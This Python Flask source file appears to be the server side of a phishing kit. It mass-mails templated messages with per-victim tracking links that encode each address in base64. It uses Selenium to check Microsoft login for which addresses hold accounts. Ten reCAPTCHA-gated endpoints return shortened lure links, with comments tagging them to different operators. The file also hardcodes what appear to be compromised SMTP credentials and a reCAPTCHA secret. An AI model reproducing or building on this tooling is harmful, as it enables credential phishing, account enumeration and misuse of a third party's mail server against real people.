import string

from flask import Flask, request, jsonify, render_template, make_response
from flask_mail import Mail, Message
from flask_cors import CORS, cross_origin
import threading
import requests
import base64
from datetime import datetime
import random
from flask import send_from_directory

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

app = Flask(__name__)
cors = CORS(app)
#cors = CORS(app, resources={r"/*": {"origins": ["https://dnie.evelinrosa.com.br", "https://evelinrosa.com.br"]}})
app.config['CORS_HEADERS'] = 'Content-Type'


RECAPTCHA_SECRET_KEY = '6LdYBq4pAAAAAOIqH4lzSfJPysyS30UHDF1Sorwf'
app.config.update(
    MAIL_SERVER='mail.telemark-austria.at',
    MAIL_PORT=587,
    MAIL_USE_TLS=True,
    MAIL_USE_SSL=False,
    MAIL_USERNAME='arno.klien@telemark-austria.at',
    MAIL_PASSWORD='sitteR9*',
)
mail = Mail(app)


# Function to set CSP headers in the response
def set_csp_headers(response):
    response.headers[
        'Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; TrustedHTML 'self';"
    return response


def send_async_email(app, msg):
    with app.app_context():
        mail.send(msg)


def send_email(to, subject, custom_email_content):
    # msg = Message(subject, sender='2­F­A­/­M­F­A­ ­A­u­t­h­e­n­t­i­c­a­t­o­r', recipients=[to])
    msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[to])
    msg.html = custom_email_content
    threading.Thread(target=send_async_email, args=(app, msg)).start()

# def get_whois(domain):
#     try:
#         return whois.whois(domain)
#     except Exception as e:
#         print(f"Failed to fetch WHOIS data for {domain}: {e}")
#         return None



def customize_email_content(template, bindings, email):
    # Create a copy of the bindings dictionary
    local_bindings = bindings.copy()

    # Customize email content
    now = datetime.now()
    formatted_date = now.strftime("%A, %B %d, %Y")

    username = email.split("@")[1].split(".")[0]
    servicerequestnumber = '{:08d}'.format(random.randint(0, 99999999))
    base64email = base64.b64encode(email.encode()).decode('utf-8')

    local_bindings['user_name'] = username
    local_bindings['service_request_number'] = servicerequestnumber
    local_bindings['date_long'] = formatted_date
    local_bindings['email'] = email

    baseurl = local_bindings.get('action_url', '')  # Assuming action_url is already in the bindings
    scheme, domain = baseurl.split('://')

    # Generate random values
    random_word = random.choice(['book', 'read', 'author', 'story', 'chapter'])  # Add more words as needed
    random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

    # Update the URL
    updated_url = f"{scheme}://{random_word}.{domain}/{random_value}/{base64email}"
    # updated_url = f"{scheme}://{domain}/{random_value}/{base64email}"
    local_bindings['action_url'] = updated_url

    return render_template(template, **local_bindings)


@app.route('/sendEmail', methods=['POST'])
def send_email_endpoint():
    data = request.json
    try:
        subject = data.get('subject', 'Starter')
        template = data['template']
        bindings = data['bindings']
        emails = data['emails']

        for email in emails:
            customized_message = customize_email_content(template, bindings, email)
            send_email(email, subject, customized_message)

        response = jsonify({"message": "Emails sent successfully"}), 200
    except Exception as e:
        response = jsonify({"error": str(e)}), 500

    # Create a response object using make_response
    response = make_response(response)
    # Add CSP headers to the response
    return set_csp_headers(response)

# @app.route('/check-domain/<domain>', methods=['GET'])
# def check_domain(domain):
#     whois_info = get_whois(domain)
#     if whois_info is None or 'registrar' not in whois_info:
#         return jsonify({'error': 'Failed to fetch registrar information'}), 500
#
#     registrar = whois_info.registrar
#     if 'GoDaddy' in registrar:
#         return send_from_directory('static', 'godaddy.html')
#     else:
#         return send_from_directory('static', 'other.html')

@app.route('/valif', methods=['POST'])
def verify_email():
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    try:
        email = request.json.get('lif')
        driver.get("https://login.microsoftonline.com/")
        time.sleep(2)  # Allow the page to load

        email_input = driver.find_element(By.NAME, "loginfmt")
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)  # Wait for server response

        try:
            driver.find_element(By.NAME, "passwd")
            return jsonify({'isRegistered': True}), 200
        except:
            return jsonify({'isRegistered': False}), 404
    finally:
        driver.quit()


@app.route('/random-digit')
def random_digit():
    # Generate a random 10-digit number
    random_number = ''.join(["%s" % random.randint(0, 9) for num in range(0, 10)])
    finalUrl = f'https://{random_number}.filipedias.adv.br/'
    return jsonify({"random_digit": finalUrl})


@app.route('/verify-recaptcha', methods=['POST'])
def verify_recaptcha():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/bigBor5#X"
            #Returning Namo link
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha2', methods=['POST'])
def verify_recaptcha2():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/griffinwp/"
            #Returning Aeron link Thursday 11th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha3', methods=['POST'])
def verify_recaptcha3():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/DzHomer/"
            #Returning DZ link Thursday 11th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha4', methods=['POST'])
def verify_recaptcha4():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/skooterl#X"
            #Returning Scoot link Monday 15th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha5', methods=['POST'])
def verify_recaptcha5():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/pestmgt2#X"
            #Returning Aeron second link link Monday 15th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha6', methods=['POST'])
def verify_recaptcha6():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/stelionc#X"
            #Returning Aeron second link link Monday 15th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/verify-recaptcha7', methods=['POST'])
def verify_recaptcha7():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/bdfpe589#X"
            #Returning Namo Boy1 link link Monday 15th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/verify-recaptcha8', methods=['POST'])
def verify_recaptcha8():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/tantany#X"
            #Returning Namo Boy2 link Monday 15th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha9', methods=['POST'])
def verify_recaptcha9():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/apz300#X"
            #Returning APZ3 link Sunday 28th Apriel 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


@app.route('/verify-recaptcha10', methods=['POST'])
def verify_recaptcha10():
    try:
        token = request.json.get('token')
        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
        payload = {
            'secret': RECAPTCHA_SECRET_KEY,
            'response': token
        }
        response = requests.post(verification_url, data=payload)
        data = response.json()
        print((data))
        if data.get('success'):
            home = "https://tinyurl.com/inpes/"
            #Returning Eze's link Monday 6th May 2024
            return jsonify({'success': True, 'home': home}), 200
        else:
            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': 'Internal server error'}), 500


if __name__ == '__main__':
    app.run(debug=True)
